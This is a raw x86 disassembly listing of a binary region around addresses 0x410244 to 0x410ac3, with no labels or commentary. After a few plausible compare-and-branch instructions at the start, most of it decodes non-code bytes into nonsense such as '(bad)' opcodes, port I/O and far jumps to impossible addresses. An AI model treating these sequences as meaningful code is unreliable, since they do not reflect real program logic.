  410244:	xor    ecx,0x75108b5
  41024a:	add    ecx,0x3272fb
  410250:	cmp    eax,ecx
  410252:	je     0x4125f9
  410258:	mov    eax,DWORD PTR [ebp-0x44]
  41025b:	mov    ecx,DWORD PTR [ebp-0x24]
  41025e:	movzx  eax,WORD PTR [ecx+eax*2]
  410262:	mov    ecx,DWORD PTR [ebp-0x20]
  410265:	jmp    0x4125ee
  41026a:	push   edi
  41026b:	scas   eax,DWORD PTR es:[edi]
  41026c:	jp     0x410212
  41026e:	bound  esi,QWORD PTR [ebp+esi*2-0x1b035694]
  410275:	xor    BYTE PTR [ecx+ebp*1-0x74],al
  410279:	(bad)  
  41027a:	fimul  DWORD PTR [eax+0x7b]
  41027d:	jnp    0x410266
  41027f:	cwde   
  410280:	jnp    0x4102fd
  410282:	test   al,0xe0
  410284:	mov    cl,0xca
  410286:	mov    bl,0xcc
  410288:	in     eax,0xb4
  41028a:	int3   
  41028b:	shl    esi,1
  41028d:	call   ecx
  41028f:	call   0x3de550
  410294:	out    0xe0,al
  410296:	out    0xd7,eax
  410298:	add    edi,esp
  41029a:	(bad)
  41029d:	fcmovb st,st(5)
  41029f:	call   0xea24d3a9
  4102a4:	lock lock out 0xf6,al
  4102a8:	int3   
  4102a9:	idiv   dl
  4102ab:	jmp    0x4102a1
  4102ad:	(bad)  
  4102ae:	retf   0xf4f9
  4102b1:	hlt    
  4102b2:	rol    DWORD PTR [edi],1
  4102b4:	rcr    edx,1
  4102b6:	not    edi
  4102b8:	aad    0xd6
  4102ba:	retf   
  4102bb:	test   ah,0x8
  4102be:	sti    
  4102bf:	in     al,dx
  4102c0:	adc    eax,esp
  4102c2:	out    dx,al
  4102c3:	iret   
  4102c4:	mov    al,0xf2
  4102c6:	out    0xd2,al
  4102c8:	ret    0xd9d2
  4102cb:	retf   0xf4bb
  4102ce:	(bad)  
  4102d0:	mov    ebp,0xf3f7fbbe
  4102d5:	(bad)  
  4102d7:	fisttp WORD PTR [ecx]
  4102d9:	or     edi,esi
  4102db:	aam    0xe0
  4102dd:	cmc    
  4102de:	loop   0x4102b8
  4102e0:	cli    
  4102e1:	jecxz  0x4102bf
  4102e3:	loope  0x4102b8
  4102e5:	mov    ch,0xf2
  4102e7:	mov    ah,0xe0
  4102e9:	xlat   BYTE PTR ds:[ebx]
  4102ea:	icebp  
  4102eb:	(bad)  
  4102ec:	mov    eax,0xf9b4d0f4
  4102f1:	add    al,cl
  4102f3:	std    
  4102f4:	jecxz  0x4102cd
  4102f6:	(bad)  
  4102f8:	fxch   st(2)
  4102fa:	std    
  4102fb:	(bad)  
  4102fc:	(bad)  
  4102fd:	or     al,0xf
  4102ff:	fsubr  st(0),st
  410301:	iret   
  410302:	ffreep st(5)
  410304:	icebp  
  410305:	ret    0xcbd6
  410308:	mov    dl,0xc5
  41030a:	loopne 0x4102fa
  41030c:	mov    dh,0xf3
  41030e:	hlt    
  41030f:	int3   
  410310:	(bad)  
  410311:	fadd   st(1),st
  410313:	int3   
  410314:	(bad)  
  410315:	sti    
  410316:	shl    esi,cl
  410318:	stc    
  410319:	cld    
  41031a:	jecxz  0x4102f7
  41031c:	clc    
  41031d:	fadd   DWORD PTR [eax]
  41031f:	std    
  410320:	stc    
  410321:	jmp    0xddf3d3d6
  410326:	in     eax,dx
  410327:	leave  
  410328:	out    0xc8,eax
  41032a:	mov    dh,0xcd
  41032c:	mov    ch,0xd3
  41032e:	enter  0xf2d3,0xda
  410332:	fst    st(2)
  410334:	add    ch,ah
  410336:	loopne 0x41031d
  410338:	loopne 0x410305
  41033a:	neg    ebx
  41033c:	loope  0x41030d
  41033e:	add    eax,0xd3b9eec8
  410343:	xlat   BYTE PTR ds:[ebx]
  410344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410345:	icebp  
  410346:	shl    BYTE PTR [esi-0x401b104c],0xe6
  41034d:	jmp    0xde3abc36
  410352:	mov    edx,0xd8bbe1ff
  410357:	out    0xfa,eax
  410359:	add    al,0xea
  41035b:	test   eax,0xb1302c9
  410361:	out    dx,al
  410362:	repnz retf 0xc8c4
  410366:	sti    
  410367:	fcmove st,st(1)
  410369:	mov    dh,0xd5
  41036b:	mov    eax,0xdfc8bbdb
  410370:	mov    eax,0xf5f3f3fe
  410375:	add    cl,ah
  410377:	fdivr  st,st(1)
  410379:	loopne 0x410359
  41037b:	aam    0xd9
  41037d:	pop    es
  41037e:	adc    esp,ebx
  410380:	out    0xd3,al
  410382:	repz mov ebp,0xc5b5d4f3
  410388:	mov    ebx,0xb5b1ffb0
  41038d:	std    
  41038e:	hlt    
  41038f:	(bad)  
  410391:	rcl    esp,cl
  410393:	mov    esi,0xeafcc505
  410398:	(bad)  
  410399:	loopne 0x4103a2
  41039b:	fdiv   st,st(6)
  41039d:	hlt    
  41039e:	iret   
  41039f:	in     eax,0xeb
  4103a1:	shl    esi,1
  4103a3:	(bad)  
  4103a5:	in     al,0xc2
  4103a7:	jecxz  0x41036e
  4103a9:	out    0xec,al
  4103ab:	rcl    dh,cl
  4103ad:	xlat   BYTE PTR ds:[ebx]
  4103ae:	hlt    
  4103af:	push   DWORD PTR [eax-0x33ff2241]
  4103b5:	in     eax,dx
  4103b6:	aam    0xda
  4103b8:	cld    
  4103b9:	loope  0x4103b3
  4103bb:	add    ebp,ebp
  4103bd:	iret   
  4103be:	call   0xa6faea8e
  4103c3:	mov    cl,0xb1
  4103c5:	lods   al,BYTE PTR ds:[esi]
  4103c6:	mov    esp,0xd9fbd3f0
  4103cb:	aam    0xd5
  4103cd:	in     eax,dx
  4103ce:	fcomi  st,st(7)
  4103d0:	add    edx,edi
  4103d2:	lock stc 
  4103d4:	rcl    ch,cl
  4103d6:	inc    esi
  4103d8:	ror    bl,cl
  4103da:	sar    bl,0xcf
  4103dd:	jmp    0x4103c0
  4103df:	fstp   st(6)
  4103e1:	repnz jmp 0xf6ec:0xfbf0c2b0
  4103e9:	mov    ecx,0xf1d9cfd8
  4103ee:	(bad)  
  4103f0:	std    
  4103f1:	out    dx,al
  4103f2:	icebp  
  4103f3:	sar    esi,1
  4103f5:	ret    0x4d5
  4103f8:	mov    eax,0xeee0dabf
  4103fd:	loop   0x4103fa
  4103ff:	in     eax,0xfa
  410401:	mov    dl,0xcd
  410403:	in     al,dx
  410404:	int3   
  410405:	mov    bl,0xf3
  410407:	xlat   BYTE PTR ds:[ebx]
  410408:	(bad)
  41040c:	stc    
  41040d:	aam    0xfb
  41040f:	std    
  410410:	leave  
  410411:	mov    eax,0xbfd5ede8
  410416:	ret    0xe9d4
  410419:	inc    BYTE PTR [edi]
  41041b:	aad    0xc4
  41041d:	jmp    0xf6ed:0xeff9e6ce
  410424:	fnsave [ebx-0x2939143b]
  41042a:	(bad)  
  41042b:	iret   
  41042c:	mov    edi,0xe9c3badf
  410431:	neg    ebx
  410433:	loopne 0x410437
  410435:	ffree  st(2)
  410437:	add    eax,0xd4ef04d2
  41043c:	fisttp QWORD PTR [esp+esi*8]
  41043f:	bswap  esp
  410441:	(bad)  
  410443:	(bad)  
  410444:	enter  0xe2e5,0xc2
  410448:	(bad)  [ecx-0x52a1228]
  41044e:	retf   0xc3d9
  410451:	aad    0xce
  410453:	fdivr  st(4),st
  410455:	in     eax,0x7
  410457:	vaddsubps ymm4,ymm1,ymm7
  41045b:	sti    
  41045c:	fimul  DWORD PTR [edx]
  41045e:	add    ch,al
  410460:	or     al,0xc5
  410462:	call   0xd1f2a92d
  410467:	ror    ecx,1
  410469:	call   0xfa11e455
  41046e:	jmp    0xdefb:0xd1edf7c3
  410475:	shl    esp,cl
  410477:	std    
  410478:	cld    
  410479:	rol    ah,0xf4
  41047c:	or     ah,al
  41047e:	stc    
  41047f:	enter  0xcacb,0xe1
  410483:	in     eax,0xce
  410485:	cmc    
  410486:	stos   BYTE PTR es:[edi],al
  410487:	jmp    0xc528b65b
  41048c:	push   DWORD PTR [ebx-0x25200512]
  410492:	stc    
  410493:	hlt    
  410494:	int3   
  410495:	fidivr WORD PTR [esi+0x409dcc0]
  41049b:	fninit 
  41049d:	cld    
  41049e:	int    0xfb
  4104a0:	(bad)  
  4104a2:	(bad)  
  4104a3:	rol    edi,1
  4104a5:	mov    dl,0xe1
  4104a7:	out    0xe6,al
  4104a9:	sar    al,0xe9
  4104ac:	aam    0xcb
  4104ae:	mov    edi,0xe8c9f2f0
  4104b3:	mov    ecx,0xff04f9d2
  4104b8:	(bad)  
  4104ba:	(bad)  
  4104bc:	(bad)  
  4104bd:	aad    0xc2
  4104bf:	fisttp QWORD PTR [edx]
  4104c1:	int    0xd1
  4104c3:	icebp  
  4104c4:	enter  0xceb5,0xc7
  4104c8:	aam    0xf4
  4104ca:	int    0xeb
  4104cc:	test   esi,0xbdeaf4fd
  4104d2:	call   0xe2340ab7
  4104d7:	ret    0xdffb
  4104da:	psubb  mm3,mm3
  4104dd:	stc    
  4104de:	cli    
  4104df:	or     al,0x6
  4104e1:	mov    ebp,0xc2d3ebcf
  4104e6:	int3   
  4104e7:	fcomi  st,st(5)
  4104e9:	fcom   st(7)
  4104eb:	rcl    dh,1
  4104ed:	iret   
  4104ee:	out    dx,al
  4104ef:	out    dx,al
  4104f0:	(bad)  
  4104f2:	mov    edi,0x2e5fae6
  4104f7:	clc    
  4104f8:	aam    0xd7
  4104fa:	cli    
  4104fb:	leave  
  4104fc:	push   esp
  4104fe:	sti    
  4104ff:	ror    ebp,cl
  410501:	call   0xd224ebcb
  410506:	(bad)  
  410507:	mov    bl,0xe1
  410509:	icebp  
  41050a:	fucomi st,st(3)
  41050c:	not    ecx
  41050e:	mov    ebp,0xd2fcceb9
  410513:	repz int3 
  410515:	rcl    al,cl
  410517:	pop    es
  410518:	mov    esp,0xde08f0d6
  41051d:	std    
  41051e:	loopne 0x41052b
  410520:	add    eax,0xf0cfb0ee
  410525:	ret    0xb7c3
  410528:	mov    bh,0xc8
  41052a:	mov    edx,0xecdbd4eb
  41052f:	retf   
  410530:	(bad)  
  410531:	fdiv   st,st(0)
  410533:	mov    ebp,0xe3ddc0f0
  410538:	sti    
  410539:	or     ecx,DWORD PTR [edi]
  41053b:	fdivp  st(7),st
  41053d:	jmp    0x410513
  41053f:	repz leave 
  410541:	repnz out 0xce,eax
  410544:	loope  0x4104f6
  410546:	mov    al,0xe8
  410548:	lock into 
  41054a:	loopne 0x410540
  41054c:	call   0xd3fcf425
  410551:	xlat   BYTE PTR ds:[ebx]
  410552:	hlt    
  410553:	cli    
  410554:	out    0xe5,eax
  410556:	cmc    
  410557:	mov    ebp,0xfde8f9e1
  41055c:	jmp    0x410523
  41055e:	add    BYTE PTR [eax],cl
  410560:	or     al,0xe2
  410562:	lods   eax,DWORD PTR ds:[esi]
  410563:	(bad)  
  410564:	int3   
  410565:	jmp    0xd3d3:0xd0d9b7d4
  41056c:	xlat   BYTE PTR ds:[ebx]
  41056d:	fucomp st(3)
  41056f:	retf   
  410570:	in     eax,dx
  410571:	mov    ebx,0xd2d0ff
  410576:	add    al,ah
  410578:	hlt    
  410579:	leave  
  41057a:	add    edx,edi
  41057c:	pop    es
  41057d:	fisttp QWORD PTR [edi]
  41057f:	clc    
  410580:	or     al,0xbe
  410582:	in     al,dx
  410583:	(bad)  
  410585:	(bad)  
  410586:	retf   
  410587:	mov    dl,0xbb
  410589:	repz aad 0xd6
  41058c:	iret   
  41058d:	fnstsw WORD PTR [ecx-0x1302334c]
  410593:	fidivr DWORD PTR [edx+esi*8-0x3509f422]
  41059a:	loope  0x41059b
  41059c:	or     bh,bl
  41059e:	add    dl,ch
  4105a0:	bnd jmp 0x41055f
  4105a3:	mov    bl,0xe3
  4105a5:	loop   0x41059c
  4105a7:	cli    
  4105a8:	mov    bl,0xc0
  4105aa:	mov    al,0xf0
  4105ac:	mov    ecx,0xbef1d7d9
  4105b1:	call   0xbe31ffa6
  4105b6:	lds    eax,FWORD PTR ds:0xe503e3e6
  4105bc:	fmul   st,st(6)
  4105be:	int3   
  4105bf:	or     bh,dh
  4105c1:	mov    bl,0xb8
  4105c3:	call   0xacfdf3b4
  4105c8:	lods   al,BYTE PTR ds:[esi]
  4105c9:	rcr    al,cl
  4105cb:	in     al,0xac
  4105cd:	call   0xf4ffc187
  4105d2:	ret    
  4105d3:	out    dx,al
  4105d4:	in     al,dx
  4105d5:	mov    esi,0xc2ddf4e3
  4105da:	fcmovnu st,st(6)
  4105dc:	stc    
  4105dd:	pop    es
  4105de:	push   cs
  4105df:	rol    esp,0xf2
  4105e2:	repz jmp 0xdbc1:0xefc3eff3
  4105ea:	mov    ebx,0xd8b5d7d6
  4105ef:	out    dx,al
  4105f0:	sti    
  4105f1:	enter  0xc7de,0xc6
  4105f5:	(bad)  
  4105f7:	add    ecx,DWORD PTR [ebx]
  4105f9:	fcmovu st,st(6)
  4105fb:	std    
  4105fc:	out    0xe8,eax
  4105fe:	push   es
  4105ff:	add    ecx,ebx
  410601:	scas   eax,DWORD PTR es:[edi]
  410602:	jecxz  0x4105bb
  410604:	jmp    0x4105b6
  410606:	mov    ch,0xfb
  410608:	call   0xe93ab8ce
  41060d:	(bad)  
  41060e:	jmp    0xd6c2:0x2bb02ce
  410615:	add    ecx,edx
  410617:	sar    bl,0x4
  41061a:	out    dx,eax
  41061b:	out    dx,al
  41061c:	(bad)  
  41061d:	cli    
  41061e:	leave  
  41061f:	repz push cs
  410621:	retf   0xd2bc
  410624:	iret   
  410625:	hlt    
  410626:	in     al,0xe5
  410628:	in     al,0xb7
  41062a:	mov    cl,0xc9
  41062c:	div    eax
  41062e:	mov    ch,0xfb
  410630:	mov    edi,0xf9fae7f3
  410635:	(bad)  
  410637:	ret    0xf5c1
  41063a:	jecxz  0x41061d
  41063c:	fimul  DWORD PTR ds:0xc1c405ed
  410642:	(bad)  
  410643:	(bad)  
  410645:	ret    0xd2b0
  410648:	shr    dh,0xe9
  41064b:	jmp    0xe03ac039
  410650:	add    edi,DWORD PTR [esi-0x63cff10]
  410656:	(bad)  
  410657:	add    dh,bh
  410659:	neg    bh
  41065b:	mul    ah
  41065d:	or     ah,ch
  41065f:	fmul   st(7),st
  410661:	shl    BYTE PTR [ecx-0x143b3c5b],1
  410667:	xlat   BYTE PTR ds:[ebx]
  410668:	loop   0x410644
  41066a:	scas   al,BYTE PTR es:[edi]
  41066b:	mov    ebx,0xbecfbdd7
  410670:	rcr    ecx,cl
  410672:	rcl    ebp,1
  410674:	out    0xda,eax
  410676:	or     esp,ebp
  410678:	cmc    
  410679:	ror    BYTE PTR [edx],1
  41067b:	out    0xe7,al
  41067d:	jecxz  0x410687
  41067f:	clc    
  410680:	fidivr DWORD PTR [esi-0x4d4d4232]
  410686:	mov    ah,0xd3
  410688:	test   al,0xb6
  41068a:	rcl    ebp,cl
  41068c:	(bad)  
  41068d:	(bad)  
  41068f:	(bad)  
  410690:	mov    ecx,0x6f2c2da
  410695:	mov    ebp,0x3c2d9f7
  41069a:	or     ebp,esp
  41069c:	clc    
  41069d:	in     eax,dx
  41069e:	std    
  41069f:	dec    BYTE PTR [eiz*8-0x4e1e4309]
  4106a6:	in     eax,dx
  4106a7:	leave  
  4106a8:	xlat   BYTE PTR ds:[ebx]
  4106a9:	aam    0xd9
  4106ab:	mov    bh,0xe5
  4106ad:	jmp    0xe3e1:0xf4ffcce9
  4106b4:	mov    ah,0xd2
  4106b6:	(bad)  
  4106b8:	dec    DWORD PTR [eax]
  4106ba:	(bad)  
  4106bb:	(bad)  [esi]
  4106bd:	iret   
  4106be:	jecxz  0x4106ca
  4106c0:	add    bl,cl
  4106c2:	test   eax,0xf0b3e2ea
  4106c7:	mov    al,0xdb
  4106c9:	loope  0x4106c3
  4106cb:	call   0xccfa038e
  4106d0:	repnz in eax,dx
  4106d2:	mov    esi,0xecbddec1
  4106d7:	sti    
  4106d8:	sar    DWORD PTR [edi-0x350b2624],1
  4106de:	add    eax,DWORD PTR ds:0xe8c8affe
  4106e4:	out    0xf0,eax
  4106e6:	iret   
  4106e7:	mul    ebp
  4106e9:	icebp  
  4106ea:	mov    edx,0xc4cdeae7
  4106ef:	leave  
  4106f0:	fsincos 
  4106f2:	loopne 0x4106d7
  4106f4:	in     al,dx
  4106f5:	fcmovnb st,st(7)
  4106f7:	add    dh,bh
  4106f9:	vpaddd xmm1,xmm2,xmm0
  4106fd:	jmp    0x4106ff
  4106ff:	int    0xf2
  410701:	in     eax,0xe5
  410703:	mov    edi,0xfbe5b1d7
  410708:	mov    ch,0xdb
  41070a:	lock (bad) 
  41070d:	into   
  41070e:	jecxz  0x4106ce
  410710:	ret    0xd1ce
  410713:	jecxz  0x4106d3
  410715:	rol    DWORD PTR [ebx],0xfe
  410718:	out    0xd7,al
  41071a:	mov    al,0xca
  41071d:	or     ch,cl
  41071f:	enter  0xd807,0xb0
  410723:	loopne 0x4106e6
  410725:	mov    ch,0xc5
  410727:	test   eax,0xfff4bbe1
  41072c:	icebp  
  41072d:	retf   
  41072e:	mov    ebx,0xd0d2d0dc
  410733:	iret   
  410734:	loope  0x410713
  410736:	aam    0x1
  410738:	fucom  st(7)
  41073a:	(bad)  
  41073c:	paddq  mm1,QWORD PTR [edx+ebx*8]
  410740:	out    dx,al
  410741:	into   
  410742:	retf   
  410743:	fmul   st(3),st
  410745:	mov    ebp,0xf1ace0f6
  41074a:	mov    ecx,0xebb4cfe7
  41074f:	mov    edi,0xd9db02e3
  410754:	lock mov edi,0xebe1bdd4
  41075a:	(bad)  
  41075c:	aam    0xfc
  41075e:	or     cl,al
  410760:	int3   
  410761:	jmp    0x410728
  410763:	mov    bl,0xe9
  410765:	lock lods eax,DWORD PTR ds:[esi]
  410767:	ror    esp,0xe5
  41076a:	cmc    
  41076b:	ror    esi,1
  41076d:	out    dx,eax
  41076e:	icebp  
  41076f:	jmp    0x410721
  410771:	out    dx,al
  410772:	add    esi,DWORD PTR [ebp-0x150a1d02]
  410778:	fincstp 
  41077a:	sti    
  41077b:	cli    
  41077c:	(bad)  
  41077d:	fdivp  st(6),st
  41077f:	or     ah,al
  410781:	shr    BYTE PTR [edi-0x3b1b2915],cl
  410787:	sti    
  410788:	mov    cl,0xcb
  41078a:	mov    edx,0xe3b7bad0
  41078f:	hlt    
  410790:	lock loope 0x41076a
  410793:	cmc    
  410794:	mov    DWORD PTR [ebx],0xeaf1d605
  41079a:	rcl    bh,1
  41079c:	in     al,0x6
  41079e:	or     al,0xc4
  4107a0:	push   es
  4107a1:	out    dx,al
  4107a2:	retf   
  4107a3:	scas   al,BYTE PTR es:[edi]
  4107a4:	mov    al,0xe6
  4107a6:	lock mov ch,0xea
  4107a9:	mov    dh,0xea
  4107ab:	rol    dh,1
  4107ad:	fild   WORD PTR [ebx]
  4107af:	fld    st(2)
  4107b1:	in     al,dx
  4107b2:	test   DWORD PTR [edi],0xfac2bef4
  4107b8:	in     eax,0xf1
  4107ba:	cli    
  4107bb:	(bad)
  4107be:	into   
  4107bf:	or     ebx,esp
  4107c1:	retf   0xb1e0
  4107c4:	in     al,0xdd
  4107c6:	loopne 0x410791
  4107c8:	(bad)  
  4107c9:	fld    st(0)
  4107cb:	int3   
  4107cc:	in     eax,0xd3
  4107ce:	mov    esp,0xc3c1b8be
  4107d3:	fsubr  st(1),st
  4107d5:	(bad)  
  4107d7:	cli    
  4107d8:	lock aam 0xd4
  4107db:	femms  
  4107dd:	add    bl,al
  4107df:	fisttp DWORD PTR ds:0xc8e0e9c5
  4107e5:	shl    esp,1
  4107e7:	lock mov dh,0xb4
  4107ea:	jmp    0x4107e1
  4107ec:	lock rcr edi,1
  4107ef:	(bad)  
  4107f0:	in     al,dx
  4107f1:	into   
  4107f2:	int3   
  4107f3:	add    al,BYTE PTR [edi]
  4107f5:	loope  0x410802
  4107f7:	rcr    bh,cl
  4107f9:	add    bl,cl
  4107fb:	push   cs
  4107fc:	clc    
  4107fd:	hlt    
  4107fe:	push   es
  4107ff:	add    al,0x1
  410801:	in     al,dx
  410802:	mov    dl,0xe6
  410804:	out    dx,al
  410805:	(bad)  
  410807:	mov    cl,0xe9
  410809:	clc    
  41080a:	icebp  
  41080b:	into   
  41080c:	fmulp  st(4),st
  41080e:	std    
  41080f:	cmc    
  410810:	repz loopne 0x4107eb
  410813:	iret   
  410814:	aam    0xf8
  410816:	rol    ecx,cl
  410818:	(bad)  
  41081a:	(bad)  
  41081b:	or     al,BYTE PTR [esi]
  41081d:	cli    
  41081e:	(bad)  
  41081f:	cld    
  410820:	shr    edi,cl
  410822:	out    0xeb,eax
  410824:	(bad)
  410827:	ror    eax,0xb4
  41082a:	repnz in al,dx
  41082c:	aam    0xfa
  41082e:	in     al,0xd2
  410830:	enter  0xf5e3,0xdc
  410834:	(bad)  
  410835:	cmc    
  410836:	fsubrp st(4),st
  410838:	ret    0xe7e1
  41083b:	movntq (bad),mm3
  41083c:	out    0xdc,eax
  41083e:	enter  0xc0e1,0xe9
  410842:	in     al,dx
  410843:	shl    ah,cl
  410845:	aad    0xe3
  410847:	hlt    
  410848:	(bad)  
  41084a:	(bad)  
  41084b:	icebp  
  41084c:	shr    cl,1
  41084e:	cli    
  41084f:	xlat   BYTE PTR ds:[ebx]
  410850:	mov    edi,0xddccdcbc
  410855:	lock inc edi
  410858:	lock or al,cl
  41085b:	aad    0xf5
  41085d:	add    eax,0xe1e2ece0
  410862:	shr    ah,cl
  410864:	not    dh
  410866:	into   
  410867:	mov    cl,0xe6
  410869:	aam    0xda
  41086b:	icebp  
  41086c:	leave  
  41086d:	aad    0xb2
  41086f:	jecxz  0x410841
  410871:	in     al,dx
  410872:	enter  0xd8e1,0xed
  410876:	cli    
  410877:	(bad)  
  410879:	fnclex 
  41087b:	add    eax,0xd802e0e4
  410880:	or     DWORD PTR [ebp-0xe363850],ebp
  410886:	hlt    
  410887:	in     al,0xdb
  410889:	mov    dh,0xf7
  41088b:	xlat   BYTE PTR ds:[ebx]
  41088c:	mov    bh,0xdf
  41088e:	retf   0xcdc9
  410891:	repnz mov eax,0xdbbfddf6
  410897:	ret    
  410898:	aam    0xdd
  41089a:	paddd  mm5,mm5
  41089d:	aam    0xdc
  41089f:	or     eax,0xe3c7cbef
  4108a4:	in     eax,0xc7
  4108a6:	aad    0xf2
  4108a8:	in     eax,dx
  4108a9:	out    0xbb,eax
  4108ab:	repnz int3 
  4108ad:	inc    ah
  4108af:	aad    0xde
  4108b1:	cli    
  4108b2:	sar    BYTE PTR [ebp-0x2021402f],cl
  4108b8:	add    al,BYTE PTR [eax]
  4108ba:	enter  0xe3e1,0xd5
  4108be:	(bad)  
  4108bf:	in     eax,dx
  4108c0:	add    edi,esp
  4108c2:	(bad)  
  4108c4:	out    dx,al
  4108c5:	lods   al,BYTE PTR ds:[esi]
  4108c6:	mov    dl,0xd1
  4108c8:	mov    dl,0xd8
  4108ca:	int3   
  4108cb:	mov    ah,0xc9
  4108cd:	(bad)  
  4108ce:	xlat   BYTE PTR ds:[ebx]
  4108cf:	shr    edi,1
  4108d1:	shl    ebx,1
  4108d3:	jecxz  0x4108a3
  4108d5:	mov    esi,0xdef706d8
  4108da:	ffreep st(0)
  4108dc:	pop    es
  4108dd:	in     eax,0xeb
  4108df:	or     eax,0xd2e5ec0f
  4108e4:	mul    bh
  4108e6:	stos   BYTE PTR es:[edi],al
  4108e7:	mov    ebx,0xd8e5b5b2
  4108ec:	in     eax,0xec
  4108ee:	mov    edx,0xe2f9bdf4
  4108f3:	sti    
  4108f4:	cmc    
  4108f5:	in     al,dx
  4108f6:	(bad)  
  4108f8:	add    cl,ah
  4108fa:	clc    
  4108fb:	out    0xc0,al
  4108fd:	std    
  4108fe:	(bad)  
  410900:	or     ecx,edx
  410902:	mov    al,0xb3
  410904:	int    0xdc
  410906:	out    0xe1,eax
  410908:	retf   
  410909:	int3   
  41090a:	shr    al,cl
  41090c:	shl    esi,cl
  41090e:	fnstcw WORD PTR [ebx-0x26082222]
  410914:	clc    
  410915:	fidivr DWORD PTR [edx-0x38fb3e00]
  41091b:	in     al,0xd4
  41091d:	(bad)  
  41091f:	or     dl,cl
  410921:	stos   BYTE PTR es:[edi],al
  410922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410923:	mov    bh,0xb3
  410925:	shl    DWORD PTR [eax+ebp*8-0x413373f],0xbf
  41092d:	sti    
  41092e:	aad    0xea
  410930:	shl    bl,1
  410932:	int3   
  410933:	lock add eax,0xa06e4f5
  410939:	cmc    
  41093a:	fsincos 
  41093c:	add    al,0xd9
  41093e:	(bad)  
  410940:	out    dx,eax
  410941:	retf   0xdfe1
  410944:	repnz out dx,eax
  410946:	(bad)  
  410947:	(bad)  
  410948:	fcmovnbe st,st(1)
  41094a:	cmc    
  41094b:	out    0xe9,eax
  41094d:	fsub   st(5),st
  41094f:	mov    esi,0xbcfeb7bc
  410954:	stc    
  410955:	out    0xe1,al
  410957:	jecxz  0x410915
  410959:	(bad)  
  41095a:	lock or DWORD PTR [eax],eax
  41095d:	add    al,0xc5
  41095f:	add    eax,0xb3e9b207
  410964:	shl    bl,0xc3
  410967:	out    0xfa,eax
  410969:	aam    0xea
  41096b:	mov    eax,0xf7ddd9d7
  410970:	enter  0xd0b7,0xf6
  410974:	(bad)  
  410975:	(bad)  
  410976:	mov    ebp,0xdbc0f1b9
  41097b:	neg    al
  41097d:	in     al,0xed
  41097f:	repnz or edi,DWORD PTR [ebp-0x1f571a0f]
  410986:	(bad)  
  410987:	test   eax,0xe9f4d4b5
  41098c:	enter  0xc4db,0xd2
  410990:	std    
  410991:	cld    
  410992:	aad    0xfc
  410994:	in     eax,0xc0
  410996:	lock stc 
  410998:	or     bl,cl
  41099a:	pop    es
  41099b:	std    
  41099c:	or     edi,ebx
  41099e:	inc    DWORD PTR [ecx]
  4109a0:	adc    al,ah
  4109a2:	leave  
  4109a3:	mov    cl,0xf2
  4109a5:	test   ebp,0xf8d8e1e1
  4109ab:	cli    
  4109ac:	std    
  4109ad:	in     al,0xed
  4109af:	repz (bad) 
  4109b1:	call   0xbf3ad87e
  4109b6:	hlt    
  4109b7:	les    eax,FWORD PTR [ebx]
  4109b9:	test   DWORD PTR [edi],0xe2c605d5
  4109bf:	out    0x1,al
  4109c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c2:	ret    
  4109c3:	out    dx,eax
  4109c4:	ret    
  4109c5:	iret   
  4109c6:	retf   
  4109c7:	rol    ch,1
  4109c9:	repz jmp 0xeebd:0xfcd3b7ea
  4109d1:	call   0xcd27e1ae
  4109d6:	mov    esp,0xf9df0903
  4109db:	out    dx,al
  4109dc:	out    0xe4,al
  4109de:	aam    0x13
  4109e0:	out    dx,eax
  4109e1:	mov    eax,0xf6dce7a6
  4109e6:	(bad)  
  4109e7:	in     eax,0xc5
  4109e9:	mov    ecx,0xebccf2d1
  4109ee:	out    dx,eax
  4109ef:	mov    cl,0xe9
  4109f1:	std    
  4109f2:	(bad)  
  4109f3:	mov    ecx,0xdada07f1
  4109f8:	add    eax,0xed5d8c0
  4109fd:	mov    BYTE PTR [edx],0xc8
  410a00:	add    eax,0xf2b1c8a9
  410a05:	in     eax,dx
  410a06:	mov    esp,0xb4e4e4c4
  410a0b:	fidivr WORD PTR [ebx-0x2e40171b]
  410a11:	add    BYTE PTR [ebp-0x39222120],bh
  410a17:	add    esi,eax
  410a19:	cmc    
  410a1a:	jmp    0x410a1b
  410a1c:	or     DWORD PTR [ebx],eax
  410a1e:	add    ecx,ebp
  410a20:	call   0xc22fb405
  410a25:	in     eax,0xd4
  410a27:	(bad)  
  410a28:	in     al,dx
  410a29:	sar    dl,cl
  410a2b:	idiv   DWORD PTR [edi-0x61c2349]
  410a31:	idiv   DWORD PTR [edi-0x1c03012d]
  410a37:	ret    0x5e5
  410a3a:	enter  0xdee4,0xf5
  410a3e:	in     eax,0xd3
  410a40:	rcr    al,0xc5
  410a43:	test   eax,0xfbb7c6cc
  410a48:	(bad)  
  410a49:	jmp    0x410a37
  410a4b:	mov    ah,0xd6
  410a4d:	sti    
  410a4e:	call   ebp
  410a50:	aam    0xef
  410a52:	out    0xdd,eax
  410a54:	int    0xc3
  410a56:	std    
  410a57:	mov    ebp,0xe0d801e4
  410a5c:	loopne 0x410a53
  410a5e:	fmul   st,st(6)
  410a60:	or     esp,esp
  410a62:	lods   al,BYTE PTR ds:[esi]
  410a63:	mov    ebp,0xcaf3c4dc
  410a68:	stc    
  410a69:	aam    0xb0
  410a6b:	enter  0xdcec,0xfb
  410a6f:	out    dx,al
  410a70:	hlt    
  410a71:	jmp    0xd600c955
  410a76:	stc    
  410a77:	bnd ret 
  410a79:	push   es
  410a7a:	fild   WORD PTR [ebx]
  410a7c:	leave  
  410a7d:	fmulp  st(1),st
  410a7f:	(bad)  
  410a81:	lods   eax,DWORD PTR ds:[esi]
  410a82:	mov    al,0xf2
  410a84:	(bad)  
  410a86:	enter  0xf3d7,0xd9
  410a8a:	(bad)
  410a8d:	int3   
  410a8e:	leave  
  410a8f:	mov    esi,0xe2c2ceed
  410a94:	ret    
  410a95:	lds    edi,FWORD PTR [ebp-0x1e2efc3c]
  410a9b:	jmp    0x410a91
  410a9d:	leave  
  410a9e:	stc    
  410a9f:	retf   
  410aa0:	shr    ebx,cl
  410aa2:	mov    ebp,0xd2f2f5f1
  410aa7:	sti    
  410aa8:	ror    al,1
  410aaa:	out    0xb1,eax
  410aac:	sti    
  410aad:	fnstcw WORD PTR [edi-0x410a010c]
  410ab3:	shl    eax,cl
  410ab5:	push   es
  410ab6:	stc    
  410ab7:	add    dl,al
  410ab9:	add    al,0xc7
  410abb:	push   cs
  410abc:	out    0xcb,al
  410abe:	or     bh,ch
  410ac0:	(bad)  
  410ac2:	(bad)  
  410ac3:	fbstp  TBYTE PTR [edi-0x322e1120]
